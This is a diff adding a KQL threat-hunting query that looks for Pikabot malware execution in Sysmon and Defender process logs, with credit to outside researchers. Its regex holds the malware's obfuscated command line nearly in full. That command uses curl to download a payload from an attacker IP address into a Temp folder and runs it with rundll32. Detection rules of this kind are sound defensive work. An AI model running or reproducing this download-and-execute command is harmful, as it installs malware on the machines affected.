@@ -1,0 +1,7 @@
+// this query identifies process execution and DNS queryes relating to the latest pikabot samples
+// credit to https://twitter.com/Cryptolaemus1 for initial research
+let lnkImage = "C:\\Windows\\System32\\cmd.exe";
+let lnkCmdline = @'"C:\\Windows\\System32\\cmd.exe" /c UL || EChO UL & p"iN"G UL || C"U"R"L" h"ttp":"//"2"07.2"46".7"8."68/6"k"Q"h"/T"7t -o C:\\Users\\.*\\AppData\\Local\\Temp\\UL.log & p"iN"G -n 3 UL || RUNDl"L"3"2" C:\\Users\\.*\\AppData\\Local\\Temp\\UL.log , HUF_inc_var & E"Xi"T.*qsCViPhzqU';
+SysmonParser
+| where Image == lnkImage and CommandLine matches regex lnkCmdline
+| union (DeviceProcessEvents | where FolderPath == lnkImage and ProcessCommandLine matches regex lnkCmdline)
